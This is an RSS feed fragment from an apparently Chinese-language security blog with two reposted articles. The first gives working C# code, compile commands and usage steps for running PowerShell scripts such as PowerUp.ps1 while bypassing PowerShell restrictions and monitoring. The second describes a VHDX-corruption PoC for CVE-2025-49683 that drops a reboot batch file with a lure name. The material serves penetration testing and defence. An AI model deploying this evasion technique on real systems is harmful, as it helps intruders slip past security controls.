&lt;p&gt;&lt;strong&gt;延伸学习&lt;/strong&gt;&lt;br&gt;
Carrie的课程推荐：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《攻击模拟工具：Atomic Red Team与CALDERA实战》&lt;/li&gt;
&lt;li&gt;《PowerShell信息安全应用》&lt;br&gt;
（支持直播/虚拟课堂及点播学习）&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>绕过PowerShell限制的简化方案</title>
        <link>http://localhost:1313/p/%E7%BB%95%E8%BF%87powershell%E9%99%90%E5%88%B6%E7%9A%84%E7%AE%80%E5%8C%96%E6%96%B9%E6%A1%88/</link>
        <pubDate>Tue, 05 Aug 2025 18:36:43 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%95%E8%BF%87powershell%E9%99%90%E5%88%B6%E7%9A%84%E7%AE%80%E5%8C%96%E6%96%B9%E6%A1%88/</guid>
        <description>&lt;h1 id=&#34;powershell-wo-powershell-简化版&#34;&gt;PowerShell w/o PowerShell 简化版
&lt;/h1&gt;&lt;p&gt;作者：Brian Fehrman&lt;/p&gt;
&lt;p&gt;在之前的文章《PowerShell without PowerShell》中，我们展示了如何绕过应用白名单软件（AWS）、PowerShell限制/监控以及命令提示符限制。某些情况下，您可能只需要绕过PowerShell限制和/或监控。本文为这种场景提供了一个简单的解决方案。该方法并非首创，但本文尝试以简明直接的方式呈现。&lt;/p&gt;
&lt;h2 id=&#34;代码progcs&#34;&gt;代码（prog.cs）
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//用法：prog.exe &amp;#34;powershell脚本路径&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Configuration.Install&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Runtime.InteropServices&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Management.Automation.Runspaces&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Program&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Mycode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Mycode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadAllText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;RunspaceConfiguration&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rspacecfg&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RunspaceConfiguration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Runspace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rspace&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RunspaceFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateRunspace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rspacecfg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;rspace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Pipeline&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pipeline&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rspace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreatePipeline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;pipeline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Commands&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddScript&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;pipeline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Invoke&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;编译方法&#34;&gt;编译方法
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Windows 7 x64&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\Users\Public\prog.exe C:\Users\Public\prog.cs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Windows 7 x86&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\Users\Public\prog.exe C:\Users\Public\prog.cs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Windows 10 x64&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\Users\Public\prog.exe C:\Users\Public\prog.cs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Windows 10 x86&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\Users\Public\prog.exe C:\Users\Public\prog.cs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;创建文件&lt;code&gt;C:\Users\Public\code.cs&lt;/code&gt;，将上述代码复制到该文件中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开Windows命令提示符，根据您的操作系统复制粘贴对应的编译命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在要运行的PowerShell脚本底部添加您通常用于运行脚本的函数调用。例如，如果要运行PowerUp.ps1中的&lt;code&gt;Invoke-AllChecks&lt;/code&gt;，通常这样写：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-AllChecks&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-File&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;allchecks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;使用本程序时，您需要将此命令复制并粘贴到PowerUp.ps1文件的底部&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;从Windows命令提示符运行以下命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Users\Public\prog.exe C:\Users\Public\PowerUp.ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;注意将&lt;code&gt;C:\Users\Public\PowerUp.ps1&lt;/code&gt;替换为您要运行的PowerShell脚本名称&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;这篇简短（希望也简单）的文章提供了一个快速解决方案，用于在PowerShell使用受限和/或被监控的环境中执行PowerShell脚本。这种方法为企业应考虑在其环境中实施更严格的AWS策略提供了额外理由。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Microsoft虚拟硬盘(VHDX)漏洞利用：远程代码执行(RCE) CVE-2025-49683详解</title>
        <link>http://localhost:1313/p/microsoft%E8%99%9A%E6%8B%9F%E7%A1%AC%E7%9B%98vhdx%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce-cve-2025-49683%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Mon, 04 Aug 2025 04:47:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/microsoft%E8%99%9A%E6%8B%9F%E7%A1%AC%E7%9B%98vhdx%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce-cve-2025-49683%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;img src="https://i.imgs.ovh/2025/08/04/JGhTH.png" alt="Featured image of post Microsoft虚拟硬盘(VHDX)漏洞利用：远程代码执行(RCE) CVE-2025-49683详解" /&gt;&lt;h1 id=&#34;microsoft-virtual-hard-disk-vhdx-11---远程代码执行rce-cve-2025-49683&#34;&gt;Microsoft Virtual Hard Disk (VHDX) 11 - 远程代码执行(RCE) CVE-2025-49683
&lt;/h1&gt;&lt;h2 id=&#34;概述&#34;&gt;概述
&lt;/h2&gt;&lt;p&gt;这个PowerShell脚本(&lt;code&gt;vdh.ps1&lt;/code&gt;)演示了Windows虚拟硬盘(VHDX)处理中的一个&lt;strong&gt;软损坏漏洞&lt;/strong&gt;，涉及&lt;strong&gt;CVE-2025-49683&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;脚本执行以下操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一个10MB大小的动态VHDX文件(虚拟磁盘)&lt;/li&gt;
&lt;li&gt;将VHDX挂载为系统新驱动器&lt;/li&gt;
&lt;li&gt;初始化、分区并用NTFS格式化虚拟磁盘&lt;/li&gt;
&lt;li&gt;卸载VHDX并在文件8KB偏移处应用&lt;strong&gt;软字节级损坏&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;重新挂载损坏的VHDX观察潜在的文件系统或挂载错误&lt;/li&gt;
&lt;li&gt;列出损坏卷内容以显示影响&lt;/li&gt;
&lt;li&gt;在挂载卷内创建&lt;strong&gt;立即重启批处理脚本(&lt;code&gt;your-salaries.bat&lt;/code&gt;)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;提供卸载和删除损坏VHDX文件的清理选项&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;目的&#34;&gt;目的
&lt;/h2&gt;&lt;p&gt;这个PoC专为&lt;strong&gt;安全研究人员和渗透测试人员&lt;/strong&gt;设计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理解轻微VHDX文件损坏如何导致系统不稳定或漏洞利用&lt;/li&gt;
&lt;li&gt;演示CVE-2025-49683如何影响VHDX挂载和使用&lt;/li&gt;
&lt;li&gt;帮助开发针对此类虚拟磁盘损坏攻击的检测和缓解策略&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;使用说明&#34;&gt;使用说明
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在提升的PowerShell会话中运行脚本&lt;/strong&gt;(以管理员身份运行 - 已授权的恶意用户)：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vdh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;脚本将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建、挂载并格式化新的VHDX文件&lt;/li&gt;
&lt;li&gt;在字节级别损坏文件&lt;/li&gt;
&lt;li&gt;重新挂载并尝试读取卷&lt;/li&gt;
&lt;li&gt;在挂载驱动器中创建your-salaries.bat批处理文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;要触发立即重启，导航到挂载驱动器(如D:)并运行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;your-salaries.bat
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;脚本结束时，按0清理(卸载并删除损坏的VHDX)，或按其他键退出并保留文件供进一步分析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
